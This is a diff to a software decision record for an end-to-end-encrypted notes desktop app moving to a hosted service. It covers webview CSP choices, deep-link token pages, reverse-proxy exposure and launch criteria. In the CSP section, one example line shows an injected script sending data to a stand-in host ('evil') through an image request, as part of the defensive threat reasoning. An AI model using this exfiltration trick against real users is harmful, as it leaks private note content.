@@ -1,6 +1,6 @@
 # Hosted service and desktop-only product — decision record
 
-Status: **proposed** (open decisions are marked *Decision needed*). Owner: project maintainer.
+Status: **proposed** (open decisions are marked *Decision needed*; promotion-site hosting is deferred). Owner: project maintainer.
 Written before any code changes; the work is tracked in [TODO.md](../TODO.md).
 
 ## 1. Product shape
@@ -71,6 +71,10 @@ Design points:
   Windows the scheme is registered by the installer, so it only works for installed builds.
 - "Cancel deletion" must work **without being signed in** (the token is the credential), so the
   app needs a small unauthenticated flow for it, same for "reset password".
+- The `/open` page is served with `Referrer-Policy: no-referrer`, a strict CSP without
+  external scripts, and `Cache-Control: no-store`. Because the fragment is never sent to a
+  server, a mail scanner that pre-fetches the link (Outlook Safe Links and similar) cannot
+  consume a single-use token.
 - Tokens stay single-use and short-lived as today; the deep link does not change their
   lifetime or storage.
 
@@ -91,7 +95,14 @@ system browser (the in-app window from 0b29f05 can go once the pages are public)
   placeholders, and the hosted-service pages need legal review before launch (§6).
 - If there is no promotion site yet, a static page on the same reverse proxy is the stopgap.
 
-*Decision needed:* promotion site on GitHub Pages, on the home server, or elsewhere.
+*Decision needed (later):* where the promotion site is hosted (the registrar's hosting
+package, GitHub Pages, or elsewhere). Revisit after the apps are finished. The only
+requirement is that the legal pages and the download stay reachable when the home server is
+down, so they must not be served from it. The legal pages belong at organisation level (the
+data controller is the operator, not the product) on fixed versioned URLs. The installers and
+the updater manifest should likewise not depend on the home server. The API hostname becomes
+the installer's default server, so choose it once; if it ever changes, keep the old name alive
+or let the updater manifest carry the new URL.
 
 ## 4. Decision C — webview CSP with a configurable server URL
 
@@ -102,14 +113,25 @@ server URL chosen at runtime cannot be listed in it.
 |---|---|---|
 | Change | Allow any HTTPS/WSS origin from the webview | Webview CSP stays `connect-src 'self' ipc:`; all API and WebSocket traffic goes through Tauri commands to the one configured origin |
 | Effort | Small | Large: new transport layer for REST, uploads/downloads and the sync WebSocket; `api.ts` and `sync.ts` sit behind a transport interface |
-| Security | Weakens a core defence: script injection through rendered note content could send decrypted notes to any server, which undermines the E2EE story | Webview cannot talk to the network at all; Rust only talks to the user-confirmed server |
+| Security | Weakens a core defence: script injection through rendered note content could send decrypted notes to any server, which undermines the E2EE story | Closes `fetch`/WebSocket exfiltration: the webview has no network `connect-src`, and Rust only talks to the user-confirmed server |
 | Test harness | Unchanged | Browser harness keeps a plain `fetch` transport behind the same interface |
 | Self-hosters | Works | Works; the configured origin is stored in app data and set only through a confirmation dialog |
 
-**Recommendation: C2.** Notes hold user-authored markdown rendered in a webview, and E2EE
+**C2 is only sound if `img-src https:` goes away.** The CSP currently allows remote images,
+and an injected script can leak data with `new Image().src = "https://evil/?d=…"` even under
+`connect-src 'self' ipc:`. The same channel lets a shared note act as a tracking pixel. So C2
+includes removing `https:` from `img-src` and loading remote images only after an explicit
+click, fetched through Rust or the server. Without that change C2 buys less than it promises.
+
+**Recommendation: C2 as the end goal.** Notes hold user-authored markdown rendered in a webview, and E2EE
 vaults are a headline feature, so keeping the webview off the network is worth the cost.
 To keep the time-to-first-working-build short, the transport interface (step 1 of §7) lands
-before the Rust implementation, and C1 is **not** shipped even temporarily outside dev builds.
+before the Rust implementation, and C1 (broad `https: wss:`) is **never shipped**, not even for the closed beta.
+
+**Closed-beta interim (C0):** pin `connect-src` to the maintainer's API origin only
+(`https://…` and `wss://…`) and **lock the server-URL field**. The beta runs only against the
+hosted server, so the Rust layer is not needed yet and nothing is weakened. The field is
+unlocked for self-hosters only once C2 works.
 
 To verify in a spike before committing: whether the Tauri HTTP plugin's scope can be set at
 runtime from Rust (if it can only be static, own commands over `reqwest` are the path), how
@@ -117,13 +139,15 @@ WebSocket frames and upload streaming behave across the IPC boundary, and the Or
 server sees (CORS/WS-Origin checks must accept the Tauri origin `http://tauri.localhost` on
 Windows, or a missing Origin from Rust, then the allowlist logic needs an explicit case).
 
-*Decision needed:* confirm C2 (or accept C1 for the closed beta only, with a dated removal
-item).
+*Decided:* C2 is the end goal; C0 (pinned origin, locked field) for the closed beta.
 
 ## 5. Reverse proxy and what is exposed
 
-- Terminates TLS (`wss://` requires it) and forwards `/api`, `/ws`, `/mcp`; also serves the
+- Terminates TLS (`wss://` requires it) and forwards `/api` and `/ws`; also serves the
   static `/open` page from Decision A.
+- `/mcp` is routed on self-hosted stacks but **not exposed on the hosted instance during the
+  closed beta**: MCP tokens have scopes and an audit log, but it is extra attack surface on a
+  home server that the beta does not need.
 - `/metrics`, `/ready` and the admin endpoint are not routed publicly; `/health` may be, for the
   app's version check.
 - `TRUSTED_PROXIES` must name the proxy (or tunnel), or the rate limiter sees one client.
@@ -144,9 +168,12 @@ Registration may be opened beyond invited users only when **all** of these hold:
 2. **Quotas:** per-account limits on storage, vaults and attachments are enforced and
    documented; abuse can be handled without touching the host (revoke/ban an account).
 3. **Legal review:** Privacy Policy, Terms, retention and deletion handling reviewed by a
-   professional; a data-breach procedure and a data-subject-request procedure exist.
-4. **E-mail:** SMTP configured so verification is enforced, and the deep-link flows from
-   Decision A work end to end.
+   professional, including **who the data controller is** (the policies must name a real
+   person or registered business; a paid plan or the refund policy may require a business
+   status); a data-breach procedure and a data-subject-request procedure exist.
+4. **E-mail:** a transactional mail provider (not the home connection) sending from the
+   service's own domain with SPF, DKIM and DMARC set, so verification is enforced and mails
+   do not land in spam, and the deep-link flows from Decision A work end to end.
 5. **Installer:** signed (no SmartScreen warning) with the Tauri updater working, and the
    app/server version-skew policy is written down (how long an old client keeps working).
 6. **Availability:** offline queue and local cache (#227) shipped, so a server outage or a
@@ -159,9 +186,12 @@ Registration may be opened beyond invited users only when **all** of these hold:
 
 1. **Docs and backlog** (this branch): this record, README/architecture/deployment/security
    updates, TODO.md groups with issues.
-2. **Server URL and transport** (`feature/server-url`): server field with the maintainer's
-   domain as default, transport interface, then the Rust transport (Decision C), Origin
-   handling, version check against the configured server.
+2. **Server URL, closed-beta form** (`feature/server-url`): the maintainer's domain as the
+   default, `connect-src` pinned to it, field locked, Origin handling for the Tauri origin,
+   version check against the configured server. Enough for the closed beta.
+   **Rust transport** (`feature/rust-transport`): transport interface, Rust REST and
+   WebSocket layer, remote images only on click, `img-src https:` removed (Decision C2);
+   then unlock the server field for self-hosters.
 3. **Deep links** (`feature/email-deep-links`): Decision A, including unauthenticated reset and
    cancel-deletion flows.
 4. **Remove the sidecar** (`refactor/remove-sidecar`): only once step 2 works end to end;
@@ -170,7 +200,9 @@ Registration may be opened beyond invited users only when **all** of these hold:
 5. **Public hosting** (`feature/public-hosting`): proxy/tunnel, invite-only registration,
    quotas, backups, SMTP.
 6. **Offline support** (`feature/offline-support`, #227) — moved up from "nice to have".
-7. **Release pipeline** (`feature/release-pipeline`): signing, updater.
+7. **Release pipeline** (`feature/release-pipeline`): signing, updater. **Start the
+   code-signing certificate application early**: identity validation takes calendar time and
+   must not wait for this step.
 8. **Legal and launch** (`docs/legal-launch`): review, hosting of the pages, go/no-go check.
 
 Steps 5–7 can overlap; the go/no-go list in §6 is the gate for leaving the closed beta.
